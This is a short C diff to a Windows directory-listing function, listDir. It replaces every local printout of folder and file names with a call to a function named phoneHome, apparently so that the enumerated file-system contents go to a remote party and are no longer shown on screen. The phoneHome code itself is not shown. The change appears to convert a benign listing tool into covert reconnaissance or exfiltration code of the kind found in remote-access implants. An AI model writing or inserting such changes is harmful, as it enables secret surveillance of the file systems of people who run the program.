@@ -25,6 +25,10 @@ int list()
 
 int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursive, int level)
 {
+	TCHAR temp[256];
+	char szString[256];
+	size_t nNumCharConverted;
+
 	TCHAR pathArr[MAX_PATH];
 	TCHAR buff[MAX_PATH];
 	WIN32_FIND_DATA findData;
@@ -43,9 +47,15 @@ int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursi
 			if (_tcscmp(findData.cFileName, TEXT(".")) && _tcscmp(findData.cFileName, TEXT("..")))
 			{
 				for (int i = 0; i < level; i++)
-					_tprintf(TEXT("\t"));
+				{
+					_stprintf_s(temp, 256, TEXT("\t"));
+					wcstombs_s(&nNumCharConverted, szString, 256, temp, 256);
+					phoneHome(szString);
+				}
 
-				_tprintf(TEXT("%s - [Dir]\n"), findData.cFileName);
+				_stprintf_s(temp, 256, TEXT("%s - [Dir]\n"), findData.cFileName);
+				wcstombs_s(&nNumCharConverted, szString, 256, temp, 256);
+				phoneHome(szString);
 
 				StringCchCopy(buff, MAX_PATH, path);
 				StringCchCat(buff, MAX_PATH, TEXT("\\"));
@@ -58,7 +68,11 @@ int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursi
 		else if (!_tcscmp(files, TEXT("Y")) || !_tcscmp(files, TEXT("y")))
 		{
 			for (int i = 0; i < level; i++) _tprintf(TEXT("\t"));
-			_tprintf(TEXT("%s \n"), findData.cFileName);
+			{
+				_stprintf_s(temp, 256, TEXT("%s \n"), findData.cFileName);
+				wcstombs_s(&nNumCharConverted, szString, 256, temp, 256);
+				phoneHome(szString);
+			}
 		}
 
 	} while (FindNextFile(findHandle, &findData) != 0);
